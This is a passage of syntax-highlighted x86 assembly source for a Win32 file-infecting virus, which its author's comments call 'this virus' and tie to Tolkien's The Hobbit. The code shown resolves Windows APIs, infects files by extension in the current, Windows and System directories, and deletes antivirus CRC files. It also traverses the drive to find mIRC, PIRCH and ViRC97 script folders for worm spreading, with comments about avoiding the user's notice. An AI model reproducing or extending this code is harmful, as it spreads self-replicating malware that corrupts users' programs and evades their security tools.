    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szUSER32</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Get all needed APIs from </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; the USER32.DLL library</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_LoadLibraryA</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@USER32_APIs</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Pointer to API strings</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@USER32_Addresses</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Pointer to API addresses</span><span class="sc0">
</span><span class="sc5">retrieve_user32_apis</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Push pointer to string</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; Push USER32 base address</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetProcAddress</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; Store the address</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; Get the end of string</span><span class="sc0">
    </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc3">""</span><span class="sc0">              </span><span class="sc1">; I like girls...</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">all_user32_apis</span><span class="sc0">                 </span><span class="sc1">; Is last api?</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">retrieve_user32_apis</span><span class="sc0">

</span><span class="sc5">all_user32_apis</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szADVAPI32</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Here we will get all needed</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; APIs from ADVAPI32.DLL</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_LoadLibraryA</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ADVAPI32_APIs</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Pointer to API names</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ADVAPI32_Addresses</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Pointer to API addresses</span><span class="sc0">
</span><span class="sc5">retrieve_advapi32_apis</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Push pointer to name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; Push ADVAPI32 base address</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetProcAddress</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; Store API address</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">           
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; Get the end of API string</span><span class="sc0">
    </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc3">""</span><span class="sc0">              </span><span class="sc1">; I like music [:)~</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">all_advapi32_apis</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">retrieve_advapi32_apis</span><span class="sc0">

</span><span class="sc5">all_advapi32_apis</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Heh, a greeting to the man (and the book!) that inspired this virus :)</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc3">"[The Hobbit (c) 1937 by J.R.R. Tolkien]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Infect current, Windows and System directories</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">InfectItAll</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">directories</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Pointer to 1st directory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mirrormirror</span><span class="sc4">],</span><span class="sc5">dirs2inf</span><span class="sc0"> </span><span class="sc1">; Set up variable</span><span class="sc0">
</span><span class="sc5">requiem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Set as current dir the</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">           </span><span class="sc1">; dir to infect</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteShit</span><span class="sc0">                      </span><span class="sc1">; Delete AV CRC files</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">; Initialize this values for each directory processed</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CurrentExt</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EXTENSIONS</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EXTENSION</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">infect_all_masks</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CurrentExt</span><span class="sc4">],</span><span class="sc5">n_EXT</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">all_mask_infected</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; EAX = EXTENSION</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; No STOSD! We don't want EDI</span><span class="sc0">
                        </span><span class="sc1">; to change...       </span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infect</span><span class="sc0">                          </span><span class="sc1">; Infect some files</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CurrentExt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect_all_masks</span><span class="sc0">
</span><span class="sc5">all_mask_infected</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">                         </span><span class="sc1">; Get another directory</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mirrormirror</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Check if we infected all</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mirrormirror</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; available directories</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">requiem</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Search MASK and infect found uninfected files</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">; reset countah</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Find's shit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_MASK</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindFirstFileA</span><span class="sc0">                 </span><span class="sc1">; Get first file on directory</span><span class="sc0">
    </span><span class="sc5">cmp_</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FailInfect</span><span class="sc0">                  </span><span class="sc1">; Failed? Shit...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AvoidShitFiles</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__2</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infection</span><span class="sc0">                       </span><span class="sc1">; Infect file</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__2</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc5">n_infections</span><span class="sc0"> </span><span class="sc1">; Did we infected them?</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">FailInfect</span><span class="sc0">                      </span><span class="sc1">; Yeah... :)</span><span class="sc0">

</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Clear name field</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">MAX_PATH</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Search for another file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindNextFileA</span><span class="sc0">
    </span><span class="sc5">cmpz</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseSearchHandle</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__1</span><span class="sc0">

</span><span class="sc5">CloseSearchHandle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Close search handle</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindClose</span><span class="sc0">
</span><span class="sc5">FailInfect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc3">"[Luthien is still alive in the world]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Traversal search for mIRC and PIRCH scripts (modified version of LJ's code)</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">TraversalSearch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tempcurdir</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Get the current directory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; (We only want the current</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">                             </span><span class="sc1">; drive)</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc0">

    </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">; Get drive</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">root</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Put it in its variable</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">root</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; Reach the root directory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; of the current drive</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">

</span><span class="sc5">Traversal</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_mIRC</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Already catched? Avoid </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RegExist</span><span class="sc0">                        </span><span class="sc1">; this if so, as it needs many</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">nomoretosearch</span><span class="sc0">                  </span><span class="sc1">; time, and the user could</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_PIRCH</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; notice our presence :)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RegExist</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">nomoretosearch</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_ViRC97</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RegExist</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">nomoretosearch</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; Clear counter</span><span class="sc0">

</span><span class="sc5">findfirstdir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Search for directories</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ALL_MASK</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindFirstFileA</span><span class="sc0">
    </span><span class="sc5">cmp_</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">notfoundfirstdir</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TSHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">main_trav</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_WFD_dwFileAttributes</span><span class="sc4">],</span><span class="sc5">directory_attr</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">findnextdir</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_WFD_szFileName</span><span class="sc4">]</span><span class="sc0">       
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"."</span><span class="sc0">              </span><span class="sc1">; Is dir "." or ".."? </span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">findnextdir</span><span class="sc0">                     </span><span class="sc1">; Shitz</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Worms</span><span class="sc0">                           </span><span class="sc1">; Let's rock!</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TSHandle</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Save handle</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; Increase counter :)</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">findfirstdir</span><span class="sc0">
</span><span class="sc5">findnextdir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Search for another dir</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TSHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindNextFileA</span><span class="sc0">
    </span><span class="sc5">cmpz</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">notfoundfirstdir</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">main_trav</span><span class="sc0">
</span><span class="sc5">notfoundfirstdir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dotdot</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Go back 1 dir</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; Are we in root? yeah, it's</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">nomoretosearch</span><span class="sc0">                  </span><span class="sc1">; over! our search finished! </span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; Decrease countah</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TSHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">findnextdir</span><span class="sc0">

</span><span class="sc5">notfoundnextdir</span><span class="sc4">:</span><span class="sc0">
